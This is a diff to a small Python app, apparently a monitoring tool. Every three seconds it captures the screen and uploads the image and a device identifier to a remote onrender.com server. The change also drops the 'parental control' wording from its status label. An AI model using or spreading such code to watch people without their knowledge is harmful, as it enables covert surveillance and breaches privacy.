@@ -6,13 +6,13 @@ import uuid
 import os
 from PIL import ImageGrab  # capturas en Windows
 
-SERVER_URL = "https://dios.onrender.com/upload-screenshot"
+SERVER_URL = "https://dios-ybjy.onrender.com/"
 DEVICE_ID = str(uuid.getnode())
 
 class ControlApp(App):
     def build(self):
         Clock.schedule_interval(self.capture_and_upload, 3)
-        return Label(text="Control parental activo")
+        return Label(text="Control activo// Conexion establecida")
 
     def capture_and_upload(self, dt):
         filename = "screenshot.png"
@@ -26,7 +26,7 @@ class ControlApp(App):
                 response = requests.post(SERVER_URL, data=data, files=files)
                 print("Subida:", response.status_code)
         except Exception as e:
-            print("Error al capturar/subir:", e)
+            print("Error al capturar o subir:", e)
 
 if __name__ == '__main__':
     ControlApp().run()
